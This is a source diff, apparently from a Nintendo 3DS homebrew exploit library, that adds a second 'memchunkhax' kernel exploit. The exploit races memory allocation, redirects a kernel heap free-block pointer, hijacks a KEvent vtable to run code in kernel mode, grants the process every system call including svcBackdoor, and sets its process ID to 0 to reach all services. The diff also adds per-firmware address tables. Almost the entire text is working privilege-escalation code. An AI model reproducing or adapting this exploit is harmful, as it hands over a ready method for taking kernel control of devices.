@@ -10,6 +10,9 @@
 #include "khax.h"
 #include "khaxinternal.h"
 
+extern u32 __ctru_heap;
+extern u32 __ctru_heap_size;
+
 //------------------------------------------------------------------------------------------------
 namespace KHAX
 {
@@ -53,6 +56,12 @@ namespace KHAX
 		static constexpr const u32 m_fcramPhysicalAddress = 0x20000000;
 		// Physical size of FCRAM on this machine
 		u32 m_fcramSize;
+		// Kernel virtual address mapping of SlabHeap
+		u32 m_slabHeapVirtualAddress;
+		// Physical mapping of SlabHeap on this machine
+		static constexpr const u32 m_slabHeapPhysicalAddress = 0x1FFA0000;
+		// Constant added to a kernel virtual address to get a physical address.
+		static constexpr const u32 m_kernelVirtualToPhysical = 0x40000000;
 		// Address of KThread address in kernel (KThread **)
 		static constexpr const PointerWrapper<KThread **> m_currentKThreadPtr = 0xFFFF9000;
 		// Address of KProcess address in kernel (KProcess **)
@@ -155,23 +164,6 @@ namespace KHAX
 		// Whether we are in a corrupted state, meaning we cannot continue if an error occurs.
 		int m_corrupted;
 
-		// Free block structure in the kernel, the one used in the memchunkhax exploit.
-		struct HeapFreeBlock
-		{
-			int m_count;
-			HeapFreeBlock *m_next;
-			HeapFreeBlock *m_prev;
-			int m_unknown1;
-			int m_unknown2;
-		};
-
-		// The layout of a memory page.
-		union Page
-		{
-			unsigned char m_bytes[4096];
-			HeapFreeBlock m_freeBlock;
-		};
-
 		// The linear memory allocated for the memchunkhax overwrite.
 		struct OverwriteMemory
 		{
@@ -210,6 +202,139 @@ namespace KHAX
 
 		// Pointer to our instance.
 		static MemChunkHax *volatile s_instance;
+	};
+
+	class MemChunkHax2
+	{
+	public:
+		// Construct using the version information for the current system.
+		MemChunkHax2(const VersionData *versionData)
+		:	m_versionData(versionData),
+			m_nextStep(1),
+			m_arbiter(__sync_get_arbiter()),
+			m_mapAddr(__ctru_heap + __ctru_heap_size),
+			m_mapSize(PAGE_SIZE * 2),
+			m_mapResult(-1),
+			m_isolatedPage(0),
+			m_isolatingPage(0),
+			m_kObjHandle(0),
+			m_kObjAddr(0),
+			m_backup(NULL),
+			m_delayThread(0),
+			m_oldVtable(NULL),
+			m_kernelResult(-1)
+		{
+			s_instance = this;
+		}
+
+		// Free memory and such.
+		~MemChunkHax2();
+
+		// Umm, don't copy this class.
+		MemChunkHax2(const MemChunkHax2 &) = delete;
+		MemChunkHax2 &operator =(const MemChunkHax2 &) = delete;
+
+		// Basic initialization.
+		Result Step1_Initialize();
+		// Isolate a physical memory page.
+		Result Step2_IsolatePage();
+		// Overwrite the kernel object's vtable pointer.
+		Result Step3_OverwriteVtable();
+		// Grant access to all services.
+		Result Step4_GrantServiceAccess();
+
+	private:
+		// Thread function to slow down svcControlMemory execution.
+		static void Step3a_DelayThread(void* arg);
+		// Thread function to allocate memory pages.
+		static void Step3b_AllocateThread(void* arg);
+		// SVC-mode entry point thunk (true entry point).
+		static void Step3c_SVCEntryPointThunk();
+		// SVC-mode entry point.
+		void Step3d_SVCEntryPoint();
+		// Grant our process access to all system calls, including svcBackdoor.
+		Result Step3e_GrantSVCAccess();
+		// Patch the process ID to 0.  Runs as svcBackdoor.
+		static Result Step4a_PatchPID();
+		// Restore the original PID.  Runs as svcBackdoor.
+		static Result Step4b_UnpatchPID();
+
+		// Creates an event and outputs its kernel object address (at ref count, not vtable pointer) from r2.
+		static Result svcCreateEventKAddr(Handle* event, u8 reset_type, u32* kaddr);
+
+		// Index of the destructor in the KEvent vtable.
+		static constexpr const u32 KEVENT_DESTRUCTOR = 4;
+
+		#define CREATE_FORWARD_FUNC(i) \
+			static void ForwardFunc##i() { \
+				s_instance->m_oldVtable[i](); \
+			}
+
+		#define REF_FORWARD_FUNC(i) \
+    		ForwardFunc##i
+
+		// Having 10 functions is an arbitrary number to make sure there are enough.
+		CREATE_FORWARD_FUNC(0)
+		CREATE_FORWARD_FUNC(1)
+		CREATE_FORWARD_FUNC(2)
+		CREATE_FORWARD_FUNC(3)
+		CREATE_FORWARD_FUNC(4)
+		CREATE_FORWARD_FUNC(5)
+		CREATE_FORWARD_FUNC(6)
+		CREATE_FORWARD_FUNC(7)
+		CREATE_FORWARD_FUNC(8)
+		CREATE_FORWARD_FUNC(9)
+
+		void(*m_vtable[10])() = {
+				REF_FORWARD_FUNC(0),
+				REF_FORWARD_FUNC(1),
+				REF_FORWARD_FUNC(2),
+				REF_FORWARD_FUNC(3),
+				Step3c_SVCEntryPointThunk, // Destructor
+				REF_FORWARD_FUNC(5),
+				REF_FORWARD_FUNC(6),
+				REF_FORWARD_FUNC(7),
+				REF_FORWARD_FUNC(8),
+				REF_FORWARD_FUNC(9)
+		};
+
+		// Version information.
+		const VersionData *const m_versionData;
+		// Next step number.
+		int m_nextStep;
+		// Address arbiter handle.
+		Handle m_arbiter;
+		// Mapped memory address.
+		u32 m_mapAddr;
+		// Mapped memory size.
+		u32 m_mapSize;
+		// svcControlMemory result.
+		Result m_mapResult;
+		// Isolated page address.
+		u32 m_isolatedPage;
+		// Isolating page address.
+		u32 m_isolatingPage;
+		// Kernel object handle.
+		Handle m_kObjHandle;
+		// Kernel object address.
+		u32 m_kObjAddr;
+		// Kernel memory backup.
+		void* m_backup;
+		// Thread used to delay memory mapping.
+		Thread m_delayThread;
+		// Vtable pointer backup.
+		void(**m_oldVtable)();
+		// Value used to test if we gained kernel code execution.
+		Result m_kernelResult;
+
+		// Copy of the old ACL
+		KSVCACL m_oldACL;
+
+		// Original process ID.
+		u32 m_originalPID;
+
+		// Pointer to our instance.
+		static MemChunkHax2 *volatile s_instance;
 	};
 
 	//------------------------------------------------------------------------------------------------
@@ -269,19 +394,31 @@ const KHAX::VersionData KHAX::VersionData::s_versionTable[] =
 #define KPROC_FUNC(ver) MakeKProcessPointers<KProcess_##ver>
 
 	// Old 3DS, old address layout
-	{ false, SYSTEM_VERSION(2, 34, 0), SYSTEM_VERSION(4, 1, 0), 0xEFF83C9F, 0xEFF827CC, 0xF0000000, 0x08000000, KPROC_FUNC(1_0_0_Old) },
-	{ false, SYSTEM_VERSION(2, 35, 6), SYSTEM_VERSION(5, 0, 0), 0xEFF83737, 0xEFF822A8, 0xF0000000, 0x08000000, KPROC_FUNC(1_0_0_Old) },
-	{ false, SYSTEM_VERSION(2, 36, 0), SYSTEM_VERSION(5, 1, 0), 0xEFF83733, 0xEFF822A4, 0xF0000000, 0x08000000, KPROC_FUNC(1_0_0_Old) },
-	{ false, SYSTEM_VERSION(2, 37, 0), SYSTEM_VERSION(6, 0, 0), 0xEFF83733, 0xEFF822A4, 0xF0000000, 0x08000000, KPROC_FUNC(1_0_0_Old) },
-	{ false, SYSTEM_VERSION(2, 38, 0), SYSTEM_VERSION(6, 1, 0), 0xEFF83733, 0xEFF822A4, 0xF0000000, 0x08000000, KPROC_FUNC(1_0_0_Old) },
-	{ false, SYSTEM_VERSION(2, 39, 4), SYSTEM_VERSION(7, 0, 0), 0xEFF83737, 0xEFF822A8, 0xF0000000, 0x08000000, KPROC_FUNC(1_0_0_Old) },
-	{ false, SYSTEM_VERSION(2, 40, 0), SYSTEM_VERSION(7, 2, 0), 0xEFF83733, 0xEFF822A4, 0xF0000000, 0x08000000, KPROC_FUNC(1_0_0_Old) },
+	{ false, SYSTEM_VERSION(2, 34, 0), SYSTEM_VERSION(4, 1, 0), 0xEFF83C9F, 0xEFF827CC, 0xF0000000, 0x08000000, 0xFFF00000, KPROC_FUNC(1_0_0_Old) },
+	{ false, SYSTEM_VERSION(2, 35, 6), SYSTEM_VERSION(5, 0, 0), 0xEFF83737, 0xEFF822A8, 0xF0000000, 0x08000000, 0xFFF70000, KPROC_FUNC(1_0_0_Old) },
+	{ false, SYSTEM_VERSION(2, 36, 0), SYSTEM_VERSION(5, 1, 0), 0xEFF83733, 0xEFF822A4, 0xF0000000, 0x08000000, 0xFFF70000, KPROC_FUNC(1_0_0_Old) },
+	{ false, SYSTEM_VERSION(2, 37, 0), SYSTEM_VERSION(6, 0, 0), 0xEFF83733, 0xEFF822A4, 0xF0000000, 0x08000000, 0xFFF70000, KPROC_FUNC(1_0_0_Old) },
+	{ false, SYSTEM_VERSION(2, 38, 0), SYSTEM_VERSION(6, 1, 0), 0xEFF83733, 0xEFF822A4, 0xF0000000, 0x08000000, 0xFFF70000, KPROC_FUNC(1_0_0_Old) },
+	{ false, SYSTEM_VERSION(2, 39, 4), SYSTEM_VERSION(7, 0, 0), 0xEFF83737, 0xEFF822A8, 0xF0000000, 0x08000000, 0xFFF00000, KPROC_FUNC(1_0_0_Old) },
+	{ false, SYSTEM_VERSION(2, 40, 0), SYSTEM_VERSION(7, 2, 0), 0xEFF83733, 0xEFF822A4, 0xF0000000, 0x08000000, 0xFFF00000, KPROC_FUNC(1_0_0_Old) },
 	// Old 3DS, new address layout
-	{ false, SYSTEM_VERSION(2, 44, 6), SYSTEM_VERSION(8, 0, 0), 0xDFF8376F, 0xDFF82294, 0xE0000000, 0x08000000, KPROC_FUNC(8_0_0_Old) },
-	{ false, SYSTEM_VERSION(2, 46, 0), SYSTEM_VERSION(9, 0, 0), 0xDFF8383F, 0xDFF82290, 0xE0000000, 0x08000000, KPROC_FUNC(8_0_0_Old) },
+	{ false, SYSTEM_VERSION(2, 44, 6), SYSTEM_VERSION(8, 0, 0), 0xDFF8376F, 0xDFF82294, 0xE0000000, 0x08000000, 0xFFF00000, KPROC_FUNC(8_0_0_Old) },
+	{ false, SYSTEM_VERSION(2, 46, 0), SYSTEM_VERSION(9, 0, 0), 0xDFF8383F, 0xDFF82290, 0xE0000000, 0x08000000, 0xFFF70000, KPROC_FUNC(8_0_0_Old) },
+	// memchunkhax does not apply to these, so patch addresses are set to 0x0.
+	{ false, SYSTEM_VERSION(2, 48, 3), SYSTEM_VERSION(9, 3, 0), 0x0, 0x0, 0xE0000000, 0x08000000, 0xFFF70000, KPROC_FUNC(8_0_0_Old) },
+	{ false, SYSTEM_VERSION(2, 49, 0), SYSTEM_VERSION(9, 5, 0), 0x0, 0x0, 0xE0000000, 0x08000000, 0xFFF70000, KPROC_FUNC(8_0_0_Old) },
+	{ false, SYSTEM_VERSION(2, 50, 1), SYSTEM_VERSION(9, 6, 0), 0x0, 0x0, 0xE0000000, 0x08000000, 0xFFF70000, KPROC_FUNC(8_0_0_Old) },
+	{ false, SYSTEM_VERSION(2, 50, 7), SYSTEM_VERSION(10, 0, 0), 0x0, 0x0, 0xE0000000, 0x08000000, 0xFFF70000, KPROC_FUNC(8_0_0_Old) },
+	{ false, SYSTEM_VERSION(2, 50, 9), SYSTEM_VERSION(10, 2, 0), 0x0, 0x0, 0xE0000000, 0x08000000, 0xFFF70000, KPROC_FUNC(8_0_0_Old) },
 	// New 3DS
-	{ true,  SYSTEM_VERSION(2, 45, 5), SYSTEM_VERSION(8, 1, 0), 0xDFF83757, 0xDFF82264, 0xE0000000, 0x10000000, KPROC_FUNC(8_0_0_New) }, // untested
-	{ true,  SYSTEM_VERSION(2, 46, 0), SYSTEM_VERSION(9, 0, 0), 0xDFF83837, 0xDFF82260, 0xE0000000, 0x10000000, KPROC_FUNC(8_0_0_New) },
+	{ true,  SYSTEM_VERSION(2, 45, 5), SYSTEM_VERSION(8, 1, 0), 0xDFF83757, 0xDFF82264, 0xE0000000, 0x10000000, 0xFFF70000, KPROC_FUNC(8_0_0_New) }, // untested
+	{ true,  SYSTEM_VERSION(2, 46, 0), SYSTEM_VERSION(9, 0, 0), 0xDFF83837, 0xDFF82260, 0xE0000000, 0x10000000, 0xFFF70000, KPROC_FUNC(8_0_0_New) },
+	// memchunkhax does not apply to these, so patch addresses are set to 0x0.
+	{ true,  SYSTEM_VERSION(2, 48, 3), SYSTEM_VERSION(9, 3, 0), 0x0, 0x0, 0xE0000000, 0x10000000, 0xFFF70000, KPROC_FUNC(8_0_0_New) },
+	{ true,  SYSTEM_VERSION(2, 49, 0), SYSTEM_VERSION(9, 5, 0), 0x0, 0x0, 0xE0000000, 0x10000000, 0xFFF70000, KPROC_FUNC(8_0_0_New) },
+	{ true,  SYSTEM_VERSION(2, 50, 1), SYSTEM_VERSION(9, 6, 0), 0x0, 0x0, 0xE0000000, 0x10000000, 0xFFF70000, KPROC_FUNC(8_0_0_New) },
+	{ true,  SYSTEM_VERSION(2, 50, 7), SYSTEM_VERSION(10, 0, 0), 0x0, 0x0, 0xE0000000, 0x10000000, 0xFFF70000, KPROC_FUNC(8_0_0_New) },
+	{ true,  SYSTEM_VERSION(2, 50, 9), SYSTEM_VERSION(10, 2, 0), 0x0, 0x0, 0xE0000000, 0x10000000, 0xFFF70000, KPROC_FUNC(8_0_0_New) },
 
 #undef KPROC_FUNC
 };
@@ -676,9 +813,7 @@ Result KHAX::MemChunkHax::Step6_ExecuteSVCCode()
 
 //------------------------------------------------------------------------------------------------
 // SVC-mode entry point thunk (true entry point).
-#ifndef _MSC_VER
-__attribute__((__naked__))
-#endif
+KHAX_ATTRIBUTE(__attribute__((__naked__)))
 Result KHAX::MemChunkHax::Step6a_SVCEntryPointThunk()
 {
 	__asm__ volatile("cpsid aif\n"
@@ -691,9 +826,7 @@ Result KHAX::MemChunkHax::Step6a_SVCEntryPointThunk()
 
 //------------------------------------------------------------------------------------------------
 // SVC-mode entry point.
-#ifndef _MSC_VER
-__attribute__((__noinline__))
-#endif
+KHAX_ATTRIBUTE(__attribute__((__noinline__)))
 Result KHAX::MemChunkHax::Step6b_SVCEntryPoint()
 {
 	if (Result result = Step6c_UndoCreateThreadPatch())
@@ -805,6 +938,12 @@ Result KHAX::MemChunkHax::Step6e_GrantSVCAccess()
 // Grant access to all services.
 Result KHAX::MemChunkHax::Step7_GrantServiceAccess()
 {
+	if (m_nextStep != 7)
+	{
+		KHAX_printf("MemChunkHax: Invalid step number %d Step7_GrantServiceAccess\n", m_nextStep);
+		return MakeError(28, 5, KHAX_MODULE, 1016);
+	}
+
 	// Backup the original PID.
 	Result result = svcGetProcessId(&m_originalPID, m_versionData->m_currentKProcessHandle);
 	if (result != 0)
@@ -953,7 +1092,6 @@ KHAX::MemChunkHax::~MemChunkHax()
 				Result res = svcControlMemory(&dummy, reinterpret_cast<u32>(&m_overwriteMemory->m_pages[x]), 0,
 					sizeof(m_overwriteMemory->m_pages[x]), MEMOP_FREE, static_cast<MemPerm>(0));
 				KHAX_printf("free %u: %08lx\n", x, res);
-				KHAX_UNUSED(res);
 			}
 		}
 	}
@@ -962,6 +1100,404 @@ KHAX::MemChunkHax::~MemChunkHax()
 	if (m_extraLinear)
 	{
 		linearFree(m_extraLinear);
+	}
+
+	// s_instance better be us
+	if (s_instance != this)
+	{
+		KHAX_printf("~:s_instance is wrong\n");
+	}
+	else
+	{
+		s_instance = nullptr;
+	}
+}
+
+//------------------------------------------------------------------------------------------------
+//
+// Class MemChunkHax2
+//
+
+//------------------------------------------------------------------------------------------------
+KHAX::MemChunkHax2 *volatile KHAX::MemChunkHax2::s_instance = nullptr;
+
+//------------------------------------------------------------------------------------------------
+// Basic initialization.
+Result KHAX::MemChunkHax2::Step1_Initialize()
+{
+	if (m_nextStep != 1)
+	{
+		KHAX_printf("MemChunkHax: Invalid step number %d for Step1_Initialize\n", m_nextStep);
+		return MakeError(28, 5, KHAX_MODULE, 1016);
+	}
+
+	// Allow executing threads on core 1.
+	aptOpenSession();
+	Result aptResult = APT_SetAppCpuTimeLimit(30);
+	if(R_FAILED(aptResult)) {
+		KHAX_printf("Step1:Allow core1 threads fail:%08lx\n", aptResult);
+		return aptResult;
+	}
+
+	aptCloseSession();
+
+	++m_nextStep;
+	return 0;
+}
+
+//------------------------------------------------------------------------------------------------
+// Isolate a physical page of memory.
+Result KHAX::MemChunkHax2::Step2_IsolatePage()
+{
+	if (m_nextStep != 2)
+	{
+		KHAX_printf("MemChunkHax: Invalid step number %d for Step2_IsolatePage\n", m_nextStep);
+		return MakeError(28, 5, KHAX_MODULE, 1016);
+	}
+
+	// Isolate a single page between others to ensure using the next pointer.
+	Result createIsolatedResult = svcControlMemory(&m_isolatedPage, m_mapAddr + m_mapSize, 0, PAGE_SIZE, MEMOP_ALLOC, (MemPerm) (MEMPERM_READ | MEMPERM_WRITE));
+	if(R_FAILED(createIsolatedResult)) {
+		KHAX_printf("Step2:Allocate isolated page fail:%08lx\n", createIsolatedResult);
+		return createIsolatedResult;
+	}
+
+	KHAX_printf("Step2:Isolated page:%08lx\n", m_isolatedPage);
+
+	Result createIsolatingResult = svcControlMemory(&m_isolatingPage, m_isolatedPage + PAGE_SIZE, 0, PAGE_SIZE, MEMOP_ALLOC, (MemPerm) (MEMPERM_READ | MEMPERM_WRITE));
+	if(R_FAILED(createIsolatingResult)) {
+		KHAX_printf("Step2:Allocate isolating page fail:%08lx\n", createIsolatingResult);
+		return createIsolatingResult;
+	}
+
+	KHAX_printf("Step2:Isolating page:%08lx\n", m_isolatingPage);
+
+	Result freeIsolatedResult = svcControlMemory(&m_isolatedPage, m_isolatedPage, 0, PAGE_SIZE, MEMOP_FREE, MEMPERM_DONTCARE);
+	if(R_FAILED(freeIsolatedResult)) {
+		KHAX_printf("Step2:Free isolated page fail:%08lx\n", freeIsolatedResult);
+		return freeIsolatedResult;
+	}
+
+	m_isolatedPage = 0;
+
+	++m_nextStep;
+	return 0;
+}
+
+//------------------------------------------------------------------------------------------------
+// Overwrite a kernel object's vtable to gain code execution.
+Result KHAX::MemChunkHax2::Step3_OverwriteVtable()
+{
+	if (m_nextStep != 3)
+	{
+		KHAX_printf("MemChunkHax: Invalid step number %d for Step3_OverwriteVtable\n", m_nextStep);
+		return MakeError(28, 5, KHAX_MODULE, 1016);
+	}
+
+	// Create a KSynchronizationObject in order to use part of its data as a fake memory block header.
+	// Within the KSynchronizationObject, refCount = size, syncedThreads = next, firstThreadNode = prev.
+	// Prev does not matter, as any verification happens prior to the overwrite.
+	// However, next must be 0, as it does not use size to check when allocation is finished.
+	// If next is not 0, it will continue to whatever is pointed to by it.
+	// Even if this eventually reaches an end, it will continue decrementing the remaining size value.
+	// This will roll over, and panic when it thinks that there is more memory to allocate than was available.
+	// FIXME: The location of this object is not entirely ideal. This is because the kernel memory
+	// FIXME: is cleared from the header location and mapped from the beginning of the page. Thus,
+	// FIXME: some of the cleared kernel memory cannot be backed up and restored. Instability ensues.
+	Result createObjResult = svcCreateEventKAddr(&m_kObjHandle, 0, &m_kObjAddr);
+	if(R_FAILED(createObjResult)) {
+		KHAX_printf("Step3:Create kernel object fail:%08lx\n", createObjResult);
+		return createObjResult;
+	}
+
+	KHAX_printf("Step3:Kernel object addr:%08lx\n", m_kObjAddr);
+
+	// Allocate a buffer for backing up kernel memory.
+	m_backup = std::malloc(PAGE_SIZE);
+	if (m_backup == NULL)
+	{
+		KHAX_printf("Step3:Allocate m_backup fail\n");
+		return MakeError(26, 3, KHAX_MODULE, 1011);
+	}
+
+	KHAX_printf("Step3:Performing race...\n");
+
+	// Create thread to slow down svcControlMemory execution.
+	m_delayThread = threadCreate(Step3a_DelayThread, this, 0x4000, 0x18, 1, true);
+	if(m_delayThread == NULL) {
+		KHAX_printf("Step3:Create delay thread fail\n");
+		return MakeError(26, 3, KHAX_MODULE, 1011);
+	}
+
+	// Create thread to allocate pagges.
+	if(threadCreate(Step3b_AllocateThread, this, 0x4000, 0x3F, 1, true) == NULL) {
+		KHAX_printf("Step3:Create allocate thread fail\n");
+		return MakeError(26, 3, KHAX_MODULE, 1011);
+	}
+
+	// Use svcArbitrateAddress to detect when the first memory page has been mapped.
+	while(static_cast<u32>(svcArbitrateAddress(m_arbiter, m_mapAddr, ARBITRATION_WAIT_IF_LESS_THAN_TIMEOUT, 0, 0)) == 0xD9001814);
+
+	// Overwrite the header "next" pointer to our crafted MemChunkHdr within our kernel object.
+	reinterpret_cast<HeapFreeBlock*>(m_mapAddr)->m_next = reinterpret_cast<HeapFreeBlock*>(m_kObjAddr - m_versionData->m_slabHeapVirtualAddress + m_versionData->m_slabHeapPhysicalAddress - m_versionData->m_kernelVirtualToPhysical);
+
+	// Use svcArbitrateAddress to detect when the kernel memory page has been mapped.
+	while(static_cast<u32>(svcArbitrateAddress(m_arbiter, m_mapAddr + PAGE_SIZE, ARBITRATION_WAIT_IF_LESS_THAN_TIMEOUT, 0, 0)) == 0xD9001814);
+
+	// Back up the kernel page before it is cleared.
+	memcpy(m_backup, reinterpret_cast<void*>(m_mapAddr + PAGE_SIZE), PAGE_SIZE);
+
+	if(m_mapResult != -1) {
+		KHAX_printf("Step3:svcControlMemory race fail\n");
+		return MakeError(26, 3, KHAX_MODULE, 1003);
+	}
+
+	// Wait for memory mapping to complete.
+	while(m_mapResult == -1) {
+		svcSleepThread(1000000);
+	}
+
+	if(R_FAILED(m_mapResult)) {
+		KHAX_printf("Step3:svcControlMemory fail:%08lx\n", m_mapResult);
+		return m_mapResult;
+	}
+
+	// Restore the kernel page backup.
+	memcpy(reinterpret_cast<void*>(m_mapAddr + PAGE_SIZE), m_backup, PAGE_SIZE);
+
+	// Get pointer to object vtable.
+	void(***vtablePtr)() = reinterpret_cast<void(***)()>(m_mapAddr + PAGE_SIZE + (m_kObjAddr & 0xFFF) - 4);
+
+	// Backup old vtable pointer.
+	m_oldVtable = *vtablePtr;
+
+	// Set new vtable pointer.
+	*vtablePtr = m_vtable;
+
+	// Close handle, executing kernel-mode code.
+	svcCloseHandle(m_kObjHandle);
+	m_kObjHandle = 0;
+
+	// Restore old vtable pointer.
+	*vtablePtr = m_oldVtable;
+
+	KHAX_printf("Step3:Kernel result:%08lx\n", m_kernelResult);
+
+	if(m_kernelResult != 0) {
+		KHAX_printf("Step3:Kernel exec fail\n");
+		return m_kernelResult;
+	}
+
+	++m_nextStep;
+	return 0;
+}
+
+//------------------------------------------------------------------------------------------------
+// Thread function to slow down svcControlMemory execution.
+void KHAX::MemChunkHax2::Step3a_DelayThread(void* arg) {
+	MemChunkHax2* hax = (MemChunkHax2*) arg;
+
+	// Slow down thread execution until the control operation has completed.
+	while(hax->m_mapResult == -1) {
+		svcSleepThread(10000);
+	}
+}
+
+//------------------------------------------------------------------------------------------------
+// Thread function to allocate memory pages.
+void KHAX::MemChunkHax2::Step3b_AllocateThread(void* arg) {
+	MemChunkHax2* hax = (MemChunkHax2*) arg;
+
+	// Allocate the requested pages.
+	hax->m_mapResult = svcControlMemory(&hax->m_mapAddr, hax->m_mapAddr, 0, hax->m_mapSize, MEMOP_ALLOC, (MemPerm) (MEMPERM_READ | MEMPERM_WRITE));
+}
+
+//------------------------------------------------------------------------------------------------
+// SVC-mode entry point thunk (true entry point).
+//KHAX_ATTRIBUTE(__attribute__((__naked__)))
+void KHAX::MemChunkHax2::Step3c_SVCEntryPointThunk()
+{
+	// Call intended function.
+	s_instance->m_oldVtable[KEVENT_DESTRUCTOR]();
+
+	s_instance->Step3d_SVCEntryPoint();
+}
+
+//------------------------------------------------------------------------------------------------
+// SVC-mode entry point thunk (true entry point).
+void KHAX::MemChunkHax2::Step3d_SVCEntryPoint()
+{
+	if (Result result = s_instance->Step3e_GrantSVCAccess())
+	{
+		m_kernelResult = result;
+		return;
+	}
+
+	m_kernelResult = 0;
+}
+
+//------------------------------------------------------------------------------------------------
+// Grant our process access to all system calls, including svcBackdoor.
+Result KHAX::MemChunkHax2::Step3e_GrantSVCAccess()
+{
+	// Everything, except nonexistent services 00, 7E or 7F.
+	static constexpr const char s_fullAccessACL[] = "\xFE\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\x3F";
+
+	// Get the KThread pointer.  Its type doesn't vary, so far.
+	KThread *kthread = *m_versionData->m_currentKThreadPtr;
+
+	// Get a pointer to the SVC ACL within the SVC area for the thread.
+	SVCThreadArea *svcThreadArea = ContainingRecord<SVCThreadArea>(kthread->m_svcRegisterState, &SVCThreadArea::m_svcRegisterState);
+	KSVCACL &threadACL = svcThreadArea->m_svcAccessControl;
+
+	// Save the old one for diagnostic purposes.
+	std::memcpy(m_oldACL, threadACL, sizeof(threadACL));
+
+	// Set the ACL for the current thread.
+	std::memcpy(threadACL, s_fullAccessACL, sizeof(threadACL));
+
+	return 0;
+}
+
+//------------------------------------------------------------------------------------------------
+// Grant access to all services.
+Result KHAX::MemChunkHax2::Step4_GrantServiceAccess()
+{
+	if (m_nextStep != 4)
+	{
+		KHAX_printf("MemChunkHax: Invalid step number %d for Step4_GrantServiceAccess\n", m_nextStep);
+		return MakeError(28, 5, KHAX_MODULE, 1016);
+	}
+
+	// Backup the original PID.
+	Result result = svcGetProcessId(&m_originalPID, m_versionData->m_currentKProcessHandle);
+	if (result != 0)
+	{
+		KHAX_printf("Step4:GetPID1 fail:%08lx\n", result);
+		return result;
+	}
+
+	KHAX_printf("Step4:current pid=%lu\n", m_originalPID);
+
+	// Patch the PID to 0, granting access to all services.
+	svcBackdoor(Step4a_PatchPID);
+
+	// Check whether PID patching succeeded.
+	u32 newPID;
+	result = svcGetProcessId(&newPID, m_versionData->m_currentKProcessHandle);
+	if (result != 0)
+	{
+		// Attempt patching back anyway, for stability reasons.
+		svcBackdoor(Step4b_UnpatchPID);
+		KHAX_printf("Step4:GetPID2 fail:%08lx\n", result);
+		return result;
+	}
+
+	if (newPID != 0)
+	{
+		KHAX_printf("Step4:nonzero:%lu\n", newPID);
+		return MakeError(27, 11, KHAX_MODULE, 1023);
+	}
+
+	// Reinit ctrulib's srv connection to gain access to all services.
+	srvExit();
+	srvInit();
+
+	// Restore the original PID now that srv has been tricked into thinking that we're PID 0.
+	svcBackdoor(Step4b_UnpatchPID);
+
+	// Check whether PID restoring succeeded.
+	result = svcGetProcessId(&newPID, m_versionData->m_currentKProcessHandle);
+	if (result != 0)
+	{
+		KHAX_printf("Step4:GetPID3 fail:%08lx\n", result);
+		return result;
+	}
+
+	if (newPID != m_originalPID)
+	{
+		KHAX_printf("Step4:not same:%lu\n", newPID);
+		return MakeError(27, 11, KHAX_MODULE, 1023);
+	}
+
+	return 0;
+}
+
+//------------------------------------------------------------------------------------------------
+// Patch the PID to 0.
+Result KHAX::MemChunkHax2::Step4a_PatchPID()
+{
+	// Disable interrupts ASAP.
+	// FIXME: Need a better solution for this.
+	__asm__ volatile("cpsid aif");
+
+	// Patch the PID to 0.  The version data has a function pointer in m_makeKProcessPointers
+	// to translate the raw KProcess pointer into pointers into key fields, and we access the
+	// m_processID field from it.
+	*(s_instance->m_versionData->m_makeKProcessPointers(*s_instance->m_versionData->m_currentKProcessPtr)
+			.m_processID) = 0;
+	return 0;
+}
+
+//------------------------------------------------------------------------------------------------
+// Restore the original PID.
+Result KHAX::MemChunkHax2::Step4b_UnpatchPID()
+{
+	// Disable interrupts ASAP.
+	// FIXME: Need a better solution for this.
+	__asm__ volatile("cpsid aif");
+
+	// Patch the PID back to the original value.
+	*(s_instance->m_versionData->m_makeKProcessPointers(*s_instance->m_versionData->m_currentKProcessPtr)
+			.m_processID) = s_instance->m_originalPID;
+	return 0;
+}
+
+//------------------------------------------------------------------------------------------------
+// Creates an event object, writing its kernel object address into kaddr from r2.
+KHAX_ATTRIBUTE(__attribute__((__naked__)))
+Result KHAX::MemChunkHax2::svcCreateEventKAddr(Handle* event, u8 reset_type, u32* kaddr) {
+	asm volatile(
+			"str r0, [sp, #-4]!\n"
+			"str r2, [sp, #-4]!\n"
+			"svc 0x17\n"
+			"ldr r3, [sp], #4\n"
+			"str r2, [r3]\n"
+			"ldr r3, [sp], #4\n"
+			"str r1, [r3]\n"
+			"bx lr"
+	);
+}
+
+//------------------------------------------------------------------------------------------------
+// Free memory and such.
+KHAX::MemChunkHax2::~MemChunkHax2()
+{
+	if(m_mapResult == 0) {
+		svcControlMemory(&m_mapAddr, m_mapAddr, 0, m_mapSize, MEMOP_FREE, MEMPERM_DONTCARE);
+	}
+
+	if(m_delayThread != NULL && m_mapResult == -1) {
+		// Set the result to 0 to terminate the delay thread.
+		m_mapResult = 0;
+	}
+
+	if(m_backup != NULL) {
+		std::free(m_backup);
+	}
+
+	if(m_isolatedPage != 0) {
+		svcControlMemory(&m_isolatedPage, m_isolatedPage, 0, PAGE_SIZE, MEMOP_FREE, MEMPERM_DONTCARE);
+		m_isolatedPage = 0;
+	}
+
+	if(m_isolatingPage != 0) {
+		svcControlMemory(&m_isolatingPage, m_isolatingPage, 0, PAGE_SIZE, MEMOP_FREE, MEMPERM_DONTCARE);
+		m_isolatingPage = 0;
+	}
+
+	if(m_kObjHandle != 0) {
+		svcCloseHandle(m_kObjHandle);
 	}
 
 	// s_instance better be us
@@ -1142,47 +1678,76 @@ extern "C" Result khaxInit()
 		return MakeError(27, 6, KHAX_MODULE, 39);
 	}
 
-	KHAX_printf("verdat t=%08lx s=%08lx v=%08lx\n", versionData->m_threadPatchAddress,
-		versionData->m_syscallPatchAddress, versionData->m_fcramVirtualAddress);
+	if(versionData->m_kernelVersion <= SYSTEM_VERSION(2, 46, 0)) {
+		KHAX_printf("verdat t=%08lx s=%08lx v=%08lx\n", versionData->m_threadPatchAddress,
+					versionData->m_syscallPatchAddress, versionData->m_fcramVirtualAddress);
 
-	// Create the hack object.
-	MemChunkHax hax{ versionData };
+		// Create the hack object.
+		MemChunkHax hax{ versionData };
 
-	// Run through the steps.
-	if (Result result = hax.Step1_Initialize())
-	{
-		KHAX_printf("khaxInit: Step1 failed: %08lx\n", result);
-		return result;
-	}
-	if (Result result = hax.Step2_AllocateMemory())
-	{
-		KHAX_printf("khaxInit: Step2 failed: %08lx\n", result);
-		return result;
-	}
-	if (Result result = hax.Step3_SurroundFree())
-	{
-		KHAX_printf("khaxInit: Step3 failed: %08lx\n", result);
-		return result;
-	}
-	if (Result result = hax.Step4_VerifyExpectedLayout())
-	{
-		KHAX_printf("khaxInit: Step4 failed: %08lx\n", result);
-		return result;
-	}
